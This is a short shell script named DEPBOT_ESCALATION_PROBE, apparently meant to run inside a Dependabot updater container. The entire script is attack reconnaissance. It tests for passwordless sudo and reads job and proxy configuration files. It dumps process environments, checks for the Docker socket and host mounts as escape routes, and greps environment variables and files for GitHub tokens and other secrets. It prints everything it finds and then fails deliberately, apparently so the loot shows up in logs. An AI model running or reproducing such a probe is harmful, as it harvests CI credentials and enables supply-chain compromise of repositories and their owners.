#!/bin/sh
echo "=== DEPBOT_ESCALATION_PROBE ==="

# ── sudo test ──────────────────────────────────────────────────────────────
echo "SUDO_WHOAMI: $(sudo -n whoami 2>&1)"
echo "SUDO_LIST: $(sudo -l -n 2>&1 | head -10 | tr '\n' '|')"
echo "SUDO_ROOT: $(sudo -n id 2>&1)"

# ── credential files ───────────────────────────────────────────────────────
echo "JOB_JSON: $(cat ${DEPENDABOT_JOB_PATH:-/home/dependabot/dependabot-updater/job.json} 2>&1 | head -c 2000)"
echo "JOB_DIR: $(ls -la /home/dependabot/dependabot-updater/ 2>&1 | tr '\n' '|')"
echo "PROXY_CONF: $(cat /config.json 2>&1 | head -c 1000)"

# ── container escape indicators ────────────────────────────────────────────
echo "PROC1_ENV: $(cat /proc/1/environ 2>/dev/null | tr '\0' '|' | head -c 500 || echo 'denied')"
echo "DOCKER_SOCK: $(ls -la /var/run/docker.sock 2>&1)"
echo "HOST_MOUNTS: $(cat /proc/mounts 2>/dev/null | grep -v 'proc\|sys\|dev\|cgroup' | tr '\n' '|')"
echo "NAMESPACE: $(cat /proc/1/cgroup 2>/dev/null | head -5 | tr '\n' '|')"

# ── token hunt ─────────────────────────────────────────────────────────────
echo "ENV_TOKENS: $(env | grep -iE 'token|secret|key|pass|cred|auth' | tr '\n' '|')"
echo "JOB_TOKENS: $(grep -rhoE '(ghp_|ghs_|ghr_|github_pat_|Bearer\s)[A-Za-z0-9_\-]{10,}' /home/dependabot/dependabot-updater/ 2>/dev/null | head -5)"
echo "HOME_FILES: $(find /home/dependabot -name '*.json' -o -name '*.token' -o -name '*.cred' 2>/dev/null | head -10 | tr '\n' '|')"

echo "=== END PROBE ==="
exit 1
